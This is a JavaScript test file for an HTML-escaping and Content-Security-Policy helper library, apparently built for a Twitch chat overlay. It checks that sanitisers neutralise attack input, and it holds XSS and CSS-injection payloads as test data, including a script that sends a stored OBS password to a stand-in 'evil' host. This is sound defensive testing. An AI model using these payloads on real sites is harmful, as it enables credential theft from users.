import test from 'node:test';
import assert from 'node:assert/strict';
import { escapeHtml, html, raw, safeColor, safeUrl, buildCsp, cspMetaTag } from '../index.mjs';

test('escapeHtml neutralises the Twitch-chat payloads that hit bus-broadcaster', () => {
  const payloads = ['<img src=x onerror=alert(1)>', '<script>fetch("//evil/"+localStorage.bb_obsPassword)</script>', '"><svg onload=1>', "' onmouseover='x"];
  for (const p of payloads) {
    const out = escapeHtml(p);
    assert.ok(!/[<>"']/.test(out), `unescaped char left in: ${out}`);
  }
});

test('escapeHtml handles null/undefined/numbers', () => {
  assert.equal(escapeHtml(null), '');
  assert.equal(escapeHtml(undefined), '');
  assert.equal(escapeHtml(42), '42');
});

test('html`` escapes interpolations, arrays, and honours raw()', () => {
  const evil = '<b onclick=x>';
  assert.equal(html`<p>${evil}</p>`, '<p>&lt;b onclick=x&gt;</p>');
  assert.equal(html`<ul>${['a', '<i>'].map((x) => raw(`<li>${escapeHtml(x)}</li>`))}</ul>`, '<ul><li>a</li><li>&lt;i&gt;</li></ul>');
  assert.equal(html`<div>${raw('<hr>')}</div>`, '<div><hr></div>');
});

test('safeColor allows real colours and rejects CSS injection', () => {
  assert.equal(safeColor('#ff00aa'), '#ff00aa');
  assert.equal(safeColor('rgb(1, 2, 3)'), 'rgb(1, 2, 3)');
  assert.equal(safeColor('red; background:url(//evil)'), '#9b59b6');
  assert.equal(safeColor('"><script>', '#000'), '#000');
  assert.equal(safeColor(undefined), '#9b59b6');
});

test('safeUrl allowlists protocols', () => {
  assert.equal(safeUrl('https://example.com/a'), 'https://example.com/a');
  assert.equal(safeUrl('javascript:alert(1)'), null);
  assert.equal(safeUrl('data:text/html,<script>1</script>'), null);
  assert.equal(safeUrl('//example.com/x'), 'https://example.com/x');
});

test('buildCsp is strict by default and merges extras without duplicates', () => {
  const csp = buildCsp({ 'connect-src': ['wss://irc-ws.chat.twitch.tv', "'self'"] });
  assert.match(csp, /default-src 'self'/);
  assert.match(csp, /object-src 'none'/);
  assert.match(csp, /connect-src 'self' wss:\/\/irc-ws\.chat\.twitch\.tv(;|$)/);
  assert.ok(!/unsafe-eval/.test(csp));
  assert.ok(!/script-src[^;]*unsafe-inline/.test(csp));
  assert.match(cspMetaTag(), /^<meta http-equiv="Content-Security-Policy" content="/);
});

test('buildCsp: inline scripts are opt-in, hashes are quoted, and unsafe-eval is never allowed', () => {
  assert.ok(!/script-src[^;]*unsafe-inline/.test(buildCsp()));
  assert.match(buildCsp({}, { inlineScripts: true }), /script-src[^;]*'unsafe-inline'/);
  assert.match(buildCsp({}, { scriptHashes: ['sha256-abc='] }), /script-src[^;]*'sha256-abc='/);
  assert.ok(!/unsafe-eval/.test(buildCsp({}, { inlineScripts: true })));
});
